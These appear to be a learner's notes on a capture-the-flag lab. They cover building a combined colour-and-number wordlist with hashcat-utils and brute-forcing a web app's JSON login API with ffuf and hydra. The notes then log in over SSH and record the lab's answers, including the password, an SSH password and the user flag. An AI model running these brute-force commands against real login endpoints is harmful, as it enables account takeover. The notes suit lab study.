**Next Step**

Now that we have a username, we need a password. Because the passwords are hashed with bcrypt and take a noticeable time to verify, bruteforcing with a large wordlist like rockyou is not feasible.  
Fortunately, this webapp has password hints!

With the username that we found in the last step, we can retrieve the password hint. From this password hint, we can create a wordlist and (more) efficiently bruteforce the user's password.

**Create your wordlist**

The password hint is "my favourite colour and my favourite number", so we can get a wordlist of colours and a wordlist of digits and combine them using Hashcat Util's Combinator which will give us every combination of the two wordlists. Using this wordlist, we can then use Hydra to attack the login API route and find the password for the user. Download the attached wordlist files, look at them then combine them using hashcat-util's combinator.  
Hashcat utils can be downloaded from: [https://github.com/hashcat/hashcat-utils/releases](https://github.com/hashcat/hashcat-utils/releases)[](https://github.com/hashcat/hashcat-utils/releases)  
Either add these to your PATH, or run them from the folder.  
We want to use the Combinator.bin binary, with colors.txt and numbers.txt as the input. The command for this is (assuming you're in the directory with the binaries and have copiesd the txt files into that directory):

./combinator.bin colors.txt numbers.txt > wordlist.txt

This will then give you a wordlist to use for Hydra.  

Create custom wordlist (combine 2 wordlists) using `hashcat scripts`. We can use `bin/combinator.bin` to combinate our colors.txt and numbers.txt:

```
./combinator.bin ../../wordlists/colors.txt ../../wordlists/numbers.txt > ../../wordlist.txt
```

![[Pasted image 20240228191054.png]]


  

**Attack the API**

The HTTP POST request that we captured earlier tells us enough about the API that we can use Hydra to attack it.  
The API is actually designed to either accept Form data, or JSON data. The frontend sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:

- Request Body - JSON
    
    {"username":"admin","password":"admin"}
    
- Request Path -
    
    /api/user/login
    
- Error message for incorrect logins -
    
    "Invalid Username Or Password"

Try to use `ffuf` again:

```
curl -L 'http://10.10.69.80/api/user/login' -d '{"username":"asd","password":"asd"}'
```

![[Pasted image 20240228191811.png]]

Adding some headers:

```
curl 'http://10.10.69.80/api/user/login' -d '{"username":"user","password":"user"}' -H 'Content-Type: application/json' -H 'Content-Type: application/x-www-form-urlencoded'
```

![[Pasted image 20240228192503.png]]

Try to brute force the password of the known user using `ffuf`:

```
ffuf -u 'http://10.10.69.80/api/user/login' -d '{"username":"james","password":"FUZZ"}' -H 'Content-Type: application/json' -H 'Content-Type: application/x-www-form-urlencoded' -w ../../wordlist.txt
```

![[Pasted image 20240228192954.png]]
![[Pasted image 20240228193012.png]]

Every response is the same in ffuf and wfuzz (42 chars long)

Using `hydra`:

The command for this is (replace the parts with angle brackets, you will need to escape special characters):

```
hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>
```


```
hydra -l james -P wordlist.txt 10.10.69.80 http-post-form '/api/user/login':'username=^USER^&password=^PASS^':'Invalid Username Or Password'
```

![[Pasted image 20240228194254.png]]


Answer the questions below

| Question                                             | Answer |
| ---------------------------------------------------- | ------ |
| Form the hydra command to attack the login API route |        |
| How many passwords were in your wordlist?            | 180    |
```
wc wordlist.txt
```

![[Pasted image 20240228194720.png]]

| Question                          | Answer |
| --------------------------------- | ------ |
| What was the user's password?     | blue7  |
| Login as the user to the platform |        |
```
ssh james@10.10.69.80
```

![[Pasted image 20240228195052.png]]


| Question                                                 | Answer     |
| -------------------------------------------------------- | ---------- |
| What's the user's SSH password?                          | dak4ddb37b |
![[Pasted image 20240228195243.png]]


| Question                                                 | Answer                                |
| -------------------------------------------------------- | ------------------------------------- |
| Log in as the user to SSH with the credentials you have. |                                       |
| What's the user flag?                                    | thm{56911bd7ba1371a3221478aa5c094d68} |
```
find / -name "user.txt" 2>/dev/null
```

![[Pasted image 20240228200643.png]]
